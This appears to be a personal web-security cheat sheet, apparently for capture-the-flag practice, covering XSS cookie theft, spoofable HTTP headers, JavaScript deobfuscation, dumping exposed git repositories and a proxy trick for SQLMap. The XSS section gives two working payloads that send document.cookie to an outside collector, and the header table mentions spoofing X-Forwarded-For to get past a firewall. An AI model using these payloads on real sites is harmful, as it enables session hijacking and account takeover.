---
title: web
date: 2018-05-04 18:17:18
---

## Cross Site Scripting / XSS
With cross-site scripting, you aim to steal session cookies of an admin or other important user. You can do this by posting JavaScript that redirects someone who visits the website to a website you own. Just send the cookie as a parameter in the GET request.

```html
1. No Filtering
<script>
location.href=("https://requestb.in/some_session?c="+document.cookie)
</script>

2. Image OnError
<img src="" onerror="location.href=('http://192.168.1.163?c=' + document.cookie)"></img>
```

https://requestb.in/ is a great website for easily capturing HTTP requests.
If you need specific response type, use https://httpbin.org/.
In the case that the server visiting your IP is network restricted or needs a specific HTTP response, you can set-up your own cookie catcher using cookie_catcher.py or as follows:
```
virtualenv -p python3 venv
source venv/bin/activate
pip install xss_catcher
xss_catcher
```

## HTTP Headers
These are some of the interesting HTTP headers and what they do. A full list can be found here: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

Header | Purpose | Example
--- | --- | ---
X-Forwarded-For | Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. Brute force WAF with [waf_bypass.py](waf_bypass.py) | X-Forwarded-For: 192.168.101.13
X-Remote-IP | Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. | X-remote-IP: 192.168.101.13
X-Originating-IP | Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. | X-originating-IP: 192.168.101.13
X-Client-IP | Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. | X-Client-IP: 192.168.101.13
X-Remote-Addr | Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. | X-remote-Addr: 192.168.101.13
X-Forwarded-Host | Identifies the original host requested by the client in the HOST header. | X-Forwarded-Host: id42.example-cdn.com
Cookie | User cookies | Cookie: key1=value1; key2=value2;
Host | The website trying to be reached. Needed because the requested page may be different from the load balancer / root IP address. | Ex: cnn.com
Origin | Discloses where a fetch came from. Doesn't disclose the whole path. | Origin: https://developer.mozilla.org
Referer | Contains address of previous web page from which link to currently requested page was followed. | Referer: https://developer.mozilla.org/en-US/docs/Web/JavaScript
From | If a human creates a bot to scrape something, they should make the bot include a From header in its requests, containing the human's email. This way, a website owner can contact the human if the bot is destructive. | From: webmaster@example.org

## Deobfuscate JavaScript
Here is a handy website to deobfuscate JavScript code.
[https://baivong.github.io/de4js/](https://baivong.github.io/de4js/)

Remember, you can also set breakpoints in JS via Chrome's developer tools console.

## Pull Publicly Exposed Git Repository
Using this, you can dump a publicly exposed git repository from a website locally.
[https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)

## Proxy
Sometimes, you want to run a tool like SQLMap on a URL but the URL keeps changing due to some dynamic variables (like maybe the current time). You can use a proxy script to act as the web server, which translates a request into the dynamically generated URL, and set that proxy server to be the target of SQLMap.

Check out this simple Flask proxy server I made [here](proxy.py) where the URL depended on the time.
